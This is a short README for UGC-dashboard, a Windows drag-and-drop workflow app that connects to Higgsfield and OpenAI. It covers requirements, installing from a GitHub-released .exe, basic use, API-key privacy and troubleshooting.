📸 UGC-dashboard - Simplify your AI content workflow

Download Latest Version

This software provides a visual dashboard to build and manage AI-powered content streams. It connects tools like Higgsfield and OpenAI to help you organize creative tasks. The interface uses a workflow style that makes complex AI processes easy to view and control.

💡 What this tool does

UGC-dashboard helps creators move tasks from one step to the next without writing code. You drag and drop blocks on your screen to create a sequence. These blocks tell the AI what to do with your video or text projects. The dashboard tracks each step to ensure your content reaches the correct format.

⚙️ System requirements

To run this application on Windows, your computer needs to meet these basic standards:

  • Windows 10 or 11 operating system.
  • At least 8 GB of RAM.
  • A stable internet connection for AI processing.
  • Current version of your web browser.

📥 Download and installation

Follow these steps to set up the dashboard on your machine:

  1. Visit the official releases page on GitHub.
  2. Select the latest version listed at the top of the page.
  3. Find the file that ends with .exe and save it to your computer.
  4. Open your Downloads folder and double-click the file to start the installer.
  5. Follow the prompts on your screen to complete the setup process.
  6. Launch the program using the icon added to your desktop.

🚀 Using the dashboard

Once the app opens, you see a grid on your screen. This is your workspace. On the left, you see a menu of AI modules. Click a module to add it to your grid. Connect the dots between modules to build your workflow. When you finish your sequence, click the run button to start the AI task. The bottom status bar shows you if the task succeeds or needs attention.

🛡️ Privacy and data

Your data stays local to your machine where possible. The dashboard sends your commands to the AI services provided by Higgsfield and OpenAI. You maintain control over your API keys within the settings menu. Never share these keys with other people.

🛠️ Troubleshooting

If the app fails to open, check that your Windows system is fully updated. If the AI modules show an error, check your internet connection and verify that your API keys are correct in the settings panel. Most issues resolve after a simple restart of the application.
